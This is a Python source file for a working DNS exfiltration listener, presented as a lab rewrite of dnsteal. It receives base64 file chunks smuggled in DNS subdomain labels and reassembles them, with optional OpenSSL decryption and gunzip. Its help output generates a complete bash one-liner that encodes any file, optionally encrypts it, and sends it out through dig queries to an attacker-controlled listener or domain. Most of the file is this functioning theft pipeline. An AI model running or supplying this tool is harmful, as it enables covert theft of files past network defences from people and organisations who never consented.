#!/usr/bin/env python3
"""
dnsteal_final_py3.py - DNS exfiltration listener for controlled labs

Python 3 rewrite inspired by m57/dnsteal.

Purpose:
    Receives DNS queries carrying base64-encoded file chunks in subdomain labels,
    reassembles them, optionally gunzips them, and writes the recovered files.

Default sender contract:
    <data1->.<data2->....<base64_filename>.<random>.zz

Data labels:
    - Carry base64 data chunks
    - End with '-'

Filename label:
    - The first label after the final data label
    - Base64-encoded filename

Example usage:
    sudo python3 dnsteal_final_py3.py 0.0.0.0
    sudo python3 dnsteal_final_py3.py 0.0.0.0 -z
    sudo python3 dnsteal_final_py3.py 0.0.0.0 -v

Notes:
    - Use -z only when the sender uses gzip.
    - Press Ctrl-C to flush received chunks to disk.
    - Intended for authorized educational/lab use only.
"""

import argparse
import base64
import gzip
import hashlib
import os
import shlex
import socket
import subprocess
import sys
from collections import OrderedDict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple


VERSION = "3.0-final-py3"


def calculate_safe_chunks(domain: str, filename_estimate: int = 15, safety_margin: int = 10) -> Tuple[int, int]:
    """
    Calculate safe chunk parameters to stay under 253 byte DNS limit.
    Also ensures each individual label stays under 63 bytes.
    
    DNS query structure: data1-.data2-.data3-.filename.random.domain
    Total must be ≤ 253 bytes, each label ≤ 63 bytes
    """
    domain = domain.strip('.')
    domain_len = len(domain)
    random_len = 5  # $RANDOM typically produces ~5 digits
    
    # Fixed overhead: domain + random + dots + safety margin
    fixed_overhead = domain_len + random_len + filename_estimate + safety_margin
    available_bytes = 253 - fixed_overhead
    
    if available_bytes <= 30:  # Need minimum space for meaningful data
        raise ValueError(f"Domain '{domain}' ({domain_len} chars) too long for DNS exfiltration. Try shorter domain.")
    
    # Try different subdomain configurations, preferring more subdomains for efficiency
    configs = [
        (4, None),  # 4 subdomains, calculate bytes per chunk
        (3, None),  # 3 subdomains, calculate bytes per chunk  
        (2, None),  # 2 subdomains, calculate bytes per chunk
        (1, None),  # 1 subdomain (last resort)
    ]
    
    for subdomains, _ in configs:
        # Account for dots between data chunks and after last chunk
        dots_overhead = subdomains + 1  # dots between chunks + dot before filename
        data_space = available_bytes - dots_overhead
        
        if data_space > 0:
            # DNS label max is 63 bytes, but we need to account for the trailing "-"
            max_chunk_size = min(62, data_space // subdomains)  # 62 to leave room for "-"
            
            # Need reasonable chunk size to be efficient
            if max_chunk_size >= 20:
                total_estimated = (subdomains * max_chunk_size) + dots_overhead + fixed_overhead
                return subdomains, max_chunk_size
    
    raise ValueError(f"Cannot create efficient chunks for domain '{domain}'. Domain too long or filename too long.")


def validate_query_length(domain: str, s: int, b: int, filename_len: int = 15) -> Tuple[bool, int]:
    """
    Validate that DNS queries will fit in 253 bytes.
    Returns (is_valid, estimated_length)
    """
    domain = domain.strip('.')
    
    # Estimate query components
    data_bytes = s * b                    # data chunks
    dots = s + 1                         # dots between chunks + before filename  
    domain_bytes = len(domain)           # domain length
    random_bytes = 5                     # $RANDOM digits
    filename_bytes = filename_len        # estimated filename
    
    estimated_length = data_bytes + dots + domain_bytes + random_bytes + filename_bytes
    return estimated_length <= 253, estimated_length


class C:
    N = "\033[0m"
    R = "\033[1;31m"
    G = "\033[1;32m"
    Y = "\033[1;33m"
    B = "\033[1;34m"
    M = "\033[1;35m"
    Cy = "\033[1;36m"
    W = "\033[1;37m"


BANNER = f"""{C.G}
      ___  _  _ ___ _____ ___   _   _
     |   \\| \\| / __|_   _| __| /_\\ | |
     | |) | .` \\__ \\ | | | _| / _ \\| |__
     |___/|_|\\_|___/ |_| |___/_/ \\_\\____|
{C.N}
   -- DNS exfiltration listener, Python 3 final lab build v{VERSION}
"""


def b64_decode_padded(data: bytes) -> bytes:
    """Decode base64 bytes, adding missing padding if required."""
    return base64.b64decode(data + b"=" * (-len(data) % 4))


def b64_encode_no_newline(data: str) -> str:
    return base64.b64encode(data.encode()).decode().rstrip("=")


def openssl_decrypt(blob: bytes, password: str) -> Optional[bytes]:
    """Decrypt AES-256-CBC/PBKDF2 data produced by openssl enc."""
    try:
        result = subprocess.run(
            [
                "openssl", "enc", "-d", "-aes-256-cbc",
                "-pbkdf2", "-pass", f"pass:{password}",
            ],
            input=blob,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
    except FileNotFoundError:
        print(f"{C.R}[!] openssl not found on listener. Install openssl or omit -p.{C.N}")
        return None

    if result.returncode != 0:
        err = result.stderr.decode("utf-8", "replace").strip()
        print(f"{C.R}[!] decrypt failed: {err or 'wrong password or corrupted data'}{C.N}")
        return None

    return result.stdout


def parse_labels(packet: bytes) -> List[bytes]:
    """Return raw labels from the DNS question section."""
    if len(packet) < 13:
        return []

    i = 12
    labels: List[bytes] = []

    while i < len(packet):
        ln = packet[i]

        # End of QNAME
        if ln == 0:
            break

        # Compressed names should not normally appear in query QNAME.
        # Avoid trying to follow pointers in this simple listener.
        if ln & 0xC0:
            break

        i += 1
        if i + ln > len(packet):
            break

        labels.append(packet[i:i + ln])
        i += ln

    return labels


def build_noerror_response(query: bytes) -> bytes:
    """Minimal DNS NOERROR response with zero answers."""
    if len(query) < 12:
        return b""

    tid = query[:2]
    flags = b"\x81\x80"       # QR=1, RD=1, RA=1, RCODE=0
    qdcount = query[4:6]
    ancount = b"\x00\x00"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"

    return tid + flags + qdcount + ancount + nscount + arcount + query[12:]


def safe_filename(name: str, fallback: str) -> str:
    """Create a safer local filename while preserving readability."""
    name = name.strip().replace("\\", "_").replace("/", "_")
    name = name.replace("..", "_")
    name = "".join(ch if 32 <= ord(ch) < 127 else "_" for ch in name)
    name = name.strip(" .")

    if not name:
        name = fallback

    return name


def unique_path(directory: Path, filename: str) -> Path:
    """Avoid overwriting existing files."""
    candidate = directory / filename
    if not candidate.exists():
        return candidate

    stem = candidate.stem
    suffix = candidate.suffix

    for i in range(1, 10000):
        alt = directory / f"{stem}_{i}{suffix}"
        if not alt.exists():
            return alt

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    return directory / f"{stem}_{timestamp}{suffix}"


def decode_filename(label: bytes) -> Optional[str]:
    """Decode base64 filename label. Return None if invalid."""
    try:
        decoded = b64_decode_padded(label).decode("utf-8", "replace")
    except Exception:
        return None

    if not decoded:
        return None

    # Keep only sensible printable filenames.
    if not all((32 <= ord(ch) < 127) for ch in decoded):
        return None

    return decoded


def extract_payload(labels: List[bytes]) -> Tuple[Optional[str], List[bytes]]:
    """
    Extract filename and data chunks from DNS labels.

    Returns:
        filename, data_chunks

    Expected format:
        data-label-.data-label-.base64filename.random.zz
    """
    i = 0
    chunks: List[bytes] = []

    while i < len(labels) and labels[i].endswith(b"-"):
        chunks.append(labels[i].rstrip(b"-"))
        i += 1

    if not chunks:
        return None, []

    filename = None
    if i < len(labels):
        filename = decode_filename(labels[i])

    return filename, chunks


def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompress: bool, password: Optional[str]) -> None:
    if not files:
        print(f"{C.Y}[!] no data received{C.N}")
        return

    output_dir.mkdir(parents=True, exist_ok=True)

    print()
    for filename, chunks in files.items():
        fallback = f"received-{datetime.now():%Y%m%d-%H%M%S}.bin"
        clean_name = safe_filename(filename, fallback)
        out_path = unique_path(output_dir, clean_name)

        raw_b64 = b"".join(chunks).replace(b"*", b"+")

        print(f"{C.Y}[>] processing {filename!r}: {len(chunks)} chunk(s), {len(raw_b64)} base64 byte(s){C.N}")

        try:
            blob = b64_decode_padded(raw_b64)
        except Exception as e:
            print(f"{C.R}[!] base64 decode failed for {filename!r}: {e}{C.N}")
            continue

        if password:
            print(f"{C.Y}[>] decrypting {filename!r} with AES-256-CBC/PBKDF2{C.N}")
            decrypted = openssl_decrypt(blob, password)
            if decrypted is None:
                continue
            blob = decrypted

        if decompress:
            try:
                blob = gzip.decompress(blob)
            except Exception as e:
                print(f"{C.R}[!] gunzip failed for {filename!r}: {e}{C.N}")
                print(f"{C.Y}    Hint: use -z only if the sender used gzip -c.{C.N}")
                continue

        try:
            with open(out_path, "wb") as fh:
                fh.write(blob)
        except OSError as e:
            print(f"{C.R}[!] failed writing {out_path}: {e}{C.N}")
            continue

        md5 = hashlib.md5(blob).hexdigest()
        sha256 = hashlib.sha256(blob).hexdigest()

        print(f"{C.G}[+] wrote {len(blob)} bytes -> {out_path}{C.N}")
        print(f"{C.G}[md5]   {md5}{C.N}")
        print(f"{C.G}[sha256]{sha256}{C.N}\n")


def help_text(listen_ip: str, s: int, b: int, domain: str, password: Optional[str], use_gzip: bool) -> str:
    """Generate contextual help based on the command arguments provided."""
    encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"
    domain = domain.strip(".") or "zz"
    
    # Determine if we're in delegated domain mode or direct mode
    is_delegated_mode = domain != "zz"
    
    # Build appropriate source command based on encryption and compression
    if password:
        password_prefix = f"export DNSTEAL_PASS={shlex.quote(password)}; "
        if use_gzip:
            source_cmd = "gzip -c \"$f\" | openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS | base64 -w0"
            mode_desc = "encrypted + gzipped"
            listener_flags = "-z -p"
        else:
            source_cmd = "openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS -in \"$f\" | base64 -w0"
            mode_desc = "encrypted"
            listener_flags = "-p"
    else:
        password_prefix = ""
        if use_gzip:
            source_cmd = "gzip -c \"$f\" | base64 -w0"
            mode_desc = "gzipped"
            listener_flags = "-z"
        else:
            source_cmd = "base64 -w0 \"$f\""
            mode_desc = "plain"
            listener_flags = ""

    # Build the appropriate dig command
    if is_delegated_mode:
        dig_cmd = "dig +noidnin +short +retries=0 +tries=1"
        mode_title = f"{C.W}Sender examples for delegated domain mode{C.N}"
        mode_note = f"{C.Cy}Domain: {domain} (uses normal DNS resolution){C.N}"
    else:
        dig_cmd = f"dig +noidnin @{listen_ip} +short +retries=0 +tries=1"
        mode_title = f"{C.W}Direct-to-listener examples{C.N}"
        mode_note = f"{C.Cy}Target: {listen_ip} (direct queries){C.N}"

    # Build the complete command
    # Build the complete command with proper bash escaping
    command = (
        f"{password_prefix}f=file.txt; s={s}; b={b}; c=0; "
        f"for r in $(for i in $({source_cmd} | fold -w{b}); "
        f"do if [[ \"$c\" -lt \"{s}\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
        f"do {dig_cmd} \"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
    )

    # Calculate and show query length validation
    is_valid, estimated_length = validate_query_length(domain, s, b)
    length_status = f"✅ ~{estimated_length} bytes" if is_valid else f"⚠️  ~{estimated_length} bytes (>253 limit!)"

    sections = ["", mode_title, "", mode_note, ""]
    
    # Add password note if encryption is enabled
    if password:
        sections.extend([
            f"{C.Y}🔐 Password encryption enabled with AES-256-CBC/PBKDF2{C.N}",
            f"{C.Y}   Sender must export DNSTEAL_PASS environment variable first{C.N}",
            ""
        ])
    
    # Add listener command for reference
    listener_cmd = f"sudo python3 {sys.argv[0]} {listen_ip}"
    if listener_flags:
        listener_cmd += f" {listener_flags}"
    if is_delegated_mode:
        listener_cmd += f" -d {domain}"
        
    sections.extend([
        f"{C.G}# {mode_desc.title()} file transfer{C.N}",
        f"{C.B}# Listener command: {listener_cmd}{C.N}",
        command,
        "",
        f"{C.W}Current configuration{C.N}",
        f"  Mode: {'🌐 Delegated domain' if is_delegated_mode else '🎯 Direct to listener'}",
        f"  Domain: {domain}",
        f"  Compression: {'✅ Enabled (-z)' if use_gzip else '❌ Disabled'}",
        f"  Encryption: {'🔐 Enabled (-p)' if password else '❌ Disabled'}",
        f"  Chunks per query: {s} subdomains",
        f"  Bytes per chunk: {b} bytes",
        "",
        f"{C.W}Available options{C.N}",
        "  -z        gunzip received data before writing",
        "  -p PASS   decrypt received data using OpenSSL AES-256-CBC/PBKDF2 before gunzip",
        "  -v        verbose: print received labels/chunks", 
        f"  -s N      data subdomains per DNS query, default {s}",
        f"  -b N      bytes per data label, default {b}",
        "  -f N      filename label length, compatibility option, default 17",
        "  -o DIR    output directory, default current directory",
        "  -d DOMAIN domain suffix for delegated-domain mode, default zz",
        "",
        f"{C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}",
    ])

    return "\n".join(sections) + "\n"


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNS exfiltration listener for authorized labs",
        add_help=True,
    )
    parser.add_argument("ip", help="IP address to bind, for example 0.0.0.0 or 192.168.1.10")
    parser.add_argument("-z", action="store_true", help="gunzip received data before writing")
    parser.add_argument("-v", action="store_true", help="verbose output")
    parser.add_argument("-s", type=int, default=4, help="data subdomains per request")
    parser.add_argument("-b", type=int, default=57, help="bytes per data label")
    parser.add_argument("-f", type=int, default=17, help="filename label length, compatibility option")
    parser.add_argument("-o", "--output-dir", default=".", help="directory to write recovered files")
    parser.add_argument("-d", "--domain", default="zz", help="domain suffix for delegated-domain mode, for example tunnel.example.com")
    parser.add_argument("-p", "--password", help="decrypt received data using OpenSSL AES-256-CBC/PBKDF2")
    args = parser.parse_args()
    
    # Auto-calculate safe chunks if using delegated domain with defaults
    original_s, original_b = args.s, args.b
    using_defaults = (args.s == 4 and args.b == 57)
    
    if args.domain != "zz":  # Delegated domain mode
        try:
            # Check if current parameters are safe
            is_valid, estimated_length = validate_query_length(args.domain, args.s, args.b)
            
            if not is_valid:
                if using_defaults:
                    # Auto-adjust since user didn't specify custom values
                    safe_s, safe_b = calculate_safe_chunks(args.domain)
                    print(f"{C.Y}[!] Auto-adjusted chunks for domain '{args.domain}': -s {safe_s} -b {safe_b}{C.N}")
                    print(f"{C.Y}    Previous: {args.s}×{args.b} = ~{estimated_length} bytes (too long){C.N}")
                    args.s, args.b = safe_s, safe_b
                    is_valid, new_length = validate_query_length(args.domain, args.s, args.b)
                    print(f"{C.Y}    New: {args.s}×{args.b} = ~{new_length} bytes (safe){C.N}")
                else:
                    # User specified custom values, just warn
                    print(f"{C.R}[!] Warning: DNS queries may be too long (~{estimated_length} bytes > 253){C.N}")
                    print(f"{C.R}    Consider using: -s {calculate_safe_chunks(args.domain)[0]} -b {calculate_safe_chunks(args.domain)[1]}{C.N}")
                    
        except ValueError as e:
            print(f"{C.R}[!] {e}{C.N}")
            print(f"{C.R}    Try a shorter domain or use direct mode (remove -d flag){C.N}")
            sys.exit(1)
    else:
        # Direct mode - validate but don't auto-adjust (direct mode is more forgiving)
        is_valid, estimated_length = validate_query_length(args.domain, args.s, args.b)
        if not is_valid and estimated_length > 300:  # Only warn for very long queries in direct mode
            print(f"{C.Y}[!] Warning: Large queries (~{estimated_length} bytes) may cause issues{C.N}")

    print(BANNER)
    print(help_text(args.ip, args.s, args.b, args.domain, args.password, args.z))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind((args.ip, 53))
    except PermissionError:
        print(f"{C.R}[!] port 53 usually needs root. Try: sudo python3 {sys.argv[0]} {args.ip}{C.N}")
        sys.exit(1)
    except OSError as e:
        print(f"{C.R}[!] bind failed on {args.ip}:53/udp: {e}{C.N}")
        sys.exit(1)

    print(f"{C.G}[+] listening on {args.ip}:53/udp{C.N}")
    if args.z:
        print(f"{C.Y}[+] gzip mode enabled: received data will be gunzipped before writing{C.N}")
    if args.password:
        print(f"{C.Y}[+] password mode enabled: data will be decrypted before optional gunzip{C.N}")
    print()

    # filename -> list of base64 data chunks
    received: Dict[str, List[bytes]] = OrderedDict()
    seen_qnames = set()
    unnamed_counter = 0

    try:
        while True:
            packet, addr = sock.recvfrom(2048)

            response = build_noerror_response(packet)
            if response:
                try:
                    sock.sendto(response, addr)
                except OSError:
                    pass

            labels = parse_labels(packet)
            if not labels:
                continue

            # In delegated-domain mode, recursive resolvers may retry or
            # forward the same DNS question from multiple resolver IPs.
            # Deduplicate by full QNAME so the same query is not counted twice.
            qname_key = b".".join(labels).lower()
            if qname_key in seen_qnames:
                if args.v:
                    pretty = qname_key.decode("latin-1", "replace")
                    print(f"{C.Y}[~] duplicate ignored from {addr[0]} -> {pretty}{C.N}")
                continue
            seen_qnames.add(qname_key)

            filename, chunks = extract_payload(labels)

            if not chunks:
                if args.v:
                    pretty = b".".join(labels).decode("latin-1", "replace")
                    print(f"{C.Y}[?] ignored {addr[0]} -> {pretty}{C.N}")
                continue

            if filename is None:
                unnamed_counter += 1
                filename = f"received-{unnamed_counter}.bin"

            if filename not in received:
                received[filename] = []
                print(f"{C.Cy}[>] receiving file: {filename} from {addr[0]}{C.N}")

            received[filename].extend(chunks)

            print(f"{C.Y}[>] {addr[0]} -> {filename}: +{len(chunks)} chunk(s), total {len(received[filename])}{C.N}")

            if args.v:
                for chunk in chunks:
                    print(f"    {chunk.decode('latin-1', 'replace')}")

    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] caught Ctrl-C, flushing received data...{C.N}")
        save_received_files(received, Path(args.output_dir), args.z, args.password)
    finally:
        sock.close()
        print(f"{C.R}[!] closed listener{C.N}")


if __name__ == "__main__":
    main()
